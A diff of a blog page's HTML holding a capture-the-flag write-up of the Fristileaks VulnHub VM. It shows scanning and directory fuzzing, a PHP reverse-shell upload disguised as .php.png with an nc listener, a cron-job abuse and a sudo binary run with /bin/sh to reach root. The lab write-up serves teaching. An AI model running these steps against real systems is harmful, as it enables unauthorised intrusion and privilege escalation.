@@ -10,8 +10,8 @@
   <meta name="description" content="Fun VM and did it on time! FristileaksSo, the usual stuff:sudo netdiscover -r 192.168.0.0/16 My target is 192.168.1.90 .sudo nmap -O -sT 192.168.1.90Starting...">
 
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://yourdomain.com/vulnhub/2016/05/26/vulnhub-fristileaks-vm.html">
-  <link rel="alternate" type="application/rss+xml" title="estafermo notes" href="http://yourdomain.com/feed.xml">
+  <link rel="canonical" href="http://localhost:4000/vulnhub/2016/06/01/vulnhub-fristileaks-vm.html">
+  <link rel="alternate" type="application/rss+xml" title="estafermo notes" href="http://localhost:4000/feed.xml">
 </head>
 
 
@@ -58,18 +58,18 @@
 
   <header class="post-header">
     <h1 class="post-title" itemprop="name headline">vulnhub fristileaks vm</h1>
-    <p class="post-meta"><time datetime="2016-05-26T01:00:10+01:00" itemprop="datePublished">May 26, 2016</time></p>
+    <p class="post-meta"><time datetime="2016-06-01T01:00:10+01:00" itemprop="datePublished">Jun 1, 2016</time></p>
   </header>
 
   <div class="post-content" itemprop="articleBody">
     <p>Fun VM and did it on time! <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">Fristileaks</a>
 <p>So, the usual stuff:
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sudo netdiscover -r 192.168.0.0/16</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>netdiscover <span class="nt">-r</span> 192.168.0.0/16</code></pre></figure>
 
 <p> My target is 192.168.1.90 .
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sudo nmap -O -sT 192.168.1.90</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>nmap <span class="nt">-O</span> <span class="nt">-sT</span> 192.168.1.90</code></pre></figure>
 
 <pre>
 Starting Nmap 6.47 ( http://nmap.org ) at 2016-06-01 22:16 WEST
@@ -88,7 +88,7 @@ Network Distance: 1 hop
 </pre>
 <p> Found a port 80 open. Opened it in firefox and simple page with a image.
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404   http://192.168.1.90/FUZZ</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python wfuzz.py <span class="nt">-c</span> <span class="nt">-z</span> file,wordlist/general/common.txt <span class="nt">--hc</span> 404   http://192.168.1.90/FUZZ</code></pre></figure>
 
 <p>Only found one dir, "images".
 <p>In that dir, there was an image http://192.168.1.90/images/3037440.jpg saying "this is not the url you're looking for" ... so what is the url ? Maybe hidden in the image as metadata?
@@ -98,12 +98,12 @@ Network Distance: 1 hop
 <p>Nope.
 <p>After a while ... a long while, trying to think how to find the correct url i fired nmap and nikto, maybe they could help me.
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sudo nmap -A 192.168.1.90</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>nmap <span class="nt">-A</span> 192.168.1.90</code></pre></figure>
 
 <p>Found some Paths! Like /cola /sisi /beer ... nothing really. Neither one was helping showing the same image grrr...
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./nikto.pl -mutate 1 -h 192.168.1.90
-./nikto.pl -mutate 1,2,3,4,5,6 -h 192.168.1.90</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./nikto.pl <span class="nt">-mutate</span> 1 <span class="nt">-h</span> 192.168.1.90
+./nikto.pl <span class="nt">-mutate</span> 1,2,3,4,5,6 <span class="nt">-h</span> 192.168.1.90</code></pre></figure>
 
 <p>A big "nope". After another longgg while it hit me!! "/cola", "/beer" and the "Keep calm and drink fristi"!DUH! So, http://192.168.1.90/fristi/
 <p> A login-password form finally and an image! I did a view source and found a comment made by the programmer called eezeepz  and a meta tag. I first pointed at the meta tag saying:
@@ -114,12 +114,12 @@ super leet password login-test page. We use base64 encoding for images so they a
 <p>Login!
 <p>Now i could upload a file, the server runs php so i thought of php-reverse-shell upload... error file format not accepted. However, i knew some versions allow something like XXX.php.png and it will run the php code! I renamed it to .png and use the usual suspect for waiting a connection:
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc -lnvvp 12344</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lnvvp</span> 12344</code></pre></figure>
 
 <p>Firefox pointing to http://192.168.1.90/fristi/uploads/php-reverse-shell.php.png and
 <p>SHELL!
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">uname -a</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">uname</span> <span class="nt">-a</span></code></pre></figure>
 
 <pre>
 Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
@@ -144,15 +144,15 @@ run every minute with my account privileges.
 </pre>
 <p>But the shell was bothering so:
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="s1">'import pty; pty.spawn("/bin/bash");'</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span></code></pre></figure>
 
 <p>Ok, i knew i had to use this, but how ? So at my second try doing something useful i tried:
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"/home/admin/chmod 777 /home/admin"</span> &gt;runthis</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"/home/admin/chmod 777 /home/admin"</span> <span class="o">&gt;</span>runthis</code></pre></figure>
 
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /home/admin
-ls -la
+<span class="nb">ls</span> <span class="nt">-la</span>
 whoisyourgodnow.txt &lt;- fristigod is owner hmm</code></pre></figure>
 
 <p> Some pass. A encrypt file in python ... should i made a decrypt ?
@@ -185,19 +185,19 @@ find / -user fristigod
 </pre>
 <p> Something hidden in /var ... and a root executable, doCom ? tried to run obviously and:
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Nice try, but wrong user ;<span class="o">)</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Nice try, but wrong user <span class="p">;</span><span class="o">)</span></code></pre></figure>
 
 <p>ehehe, fristigod can't sudo.. can admin ? noooo. Can i change permission of it like i did for home? i doubt it, but tried it: nah.
 <p>After hitting my head for a while i decided to view .bash_history in /var/fristigod
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="s2">"nothing"</span>
 <span class="s2">"nothing"</span>
-sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+<span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom
 <span class="s2">"nothing, wait what ?"</span></code></pre></figure>
 
 <p>Big duh! again. I tried and it needed a parameter.NO PROBLEM, take this:
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/sh</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom /bin/sh</code></pre></figure>
 
 <p>ROOT!
 <p>Now where is my flag!
@@ -241,7 +241,7 @@ sh-4.1#
     <div class="footer-col-wrapper">
       <div class="footer-col footer-col-1">
         <ul class="contact-list">
-          <li><a href="">estafermo@protonmail.com</a></li>
+          <li><a href="mailto:estafermo@protonmail.com">estafermo@protonmail.com</a></li>
         </ul>
       </div>
 
